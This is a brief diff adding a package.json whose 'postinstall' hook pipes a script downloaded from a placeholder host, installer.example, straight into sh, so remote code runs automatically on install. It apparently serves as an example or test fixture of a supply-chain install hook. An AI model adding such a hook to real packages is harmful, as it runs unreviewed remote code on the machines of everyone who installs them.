@@ -1,0 +1,6 @@
+{
+  "scripts": {
+    "postinstall": "curl https://installer.example/install.sh | sh",
+    "test": "echo ok"
+  }
+}
